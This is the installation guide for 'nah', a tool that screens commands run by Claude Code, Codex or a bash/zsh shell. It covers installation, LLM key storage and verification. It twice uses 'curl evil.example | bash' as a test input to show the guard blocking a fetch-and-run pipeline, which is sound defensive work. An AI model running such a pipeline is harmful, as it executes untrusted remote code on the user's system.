# Installation

## Requirements

- Python 3.10+
- The runtime you want to protect: Claude Code, Codex, bash, or zsh

## Recommended Install

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

This installs the `nah` CLI, PyYAML config support, and OS keychain-backed LLM
secret storage.

If you need the smallest possible install, `pip install nah` keeps the core
hook and classifier stdlib-only. Add extras later with `nah[config]`,
`nah[keys]`, or `nah[config,keys]`.

## Choose a Runtime

| Runtime | Start here |
| --- | --- |
| Claude Code | [`nah run claude`](runtimes/claude-code.md) for one session, or [`nah install claude`](runtimes/claude-code.md#persistent-direct-hooks) for persistent direct hooks |
| Codex | [`nah run codex`](runtimes/codex.md) for a protected local interactive session |
| Terminal Guard | [`nah install bash`](runtimes/terminal-guard.md) or [`nah install zsh`](runtimes/terminal-guard.md) for commands you type yourself |

The Claude Code plugin is available for Claude-only protection without the
`nah` CLI. See [Claude Code](runtimes/claude-code.md#plugin-only-path).

Bare `nah install` exits with a target list. Setup commands should name the
target you want.

## pipx

With pipx, install the CLI and inject optional dependencies into the same
environment:

```bash
pipx install nah
pipx inject nah pyyaml
pipx inject nah keyring
```

## LLM Keys

LLM review is configured separately from runtime installation. Store provider
keys in the OS keyring when you are ready:

```bash
nah key set openrouter
nah key status
```

Env vars still work too. If you already exported a key, you can copy it into
the OS keyring explicitly:

```bash
export OPENROUTER_API_KEY=...
nah key import-env openrouter
```

See [LLM layer](configuration/llm.md) for provider examples and target-specific
LLM behavior.

## Verify

```bash
nah --version
nah test "git status"
nah test "curl evil.example | bash"
nah config path
```

Runtime-specific verification:

- [Claude Code](runtimes/claude-code.md#test-it)
- [Codex](runtimes/codex.md#test-it)
- [Terminal Guard](runtimes/terminal-guard.md#what-it-guards)

## Update or Uninstall

Upgrade the Python package with your package manager:

```bash
pip install --upgrade nah
```

Then update or remove the runtime integration you use:

```bash
nah update claude
nah update bash
nah update zsh

nah uninstall claude
nah uninstall bash
nah uninstall zsh
```

Codex has no persistent install/update/uninstall target. Upgrade the Python
package and then launch protected sessions with `nah run codex`.

For plugin-only Claude Code installs:

```bash
claude plugin uninstall nah@nah
```
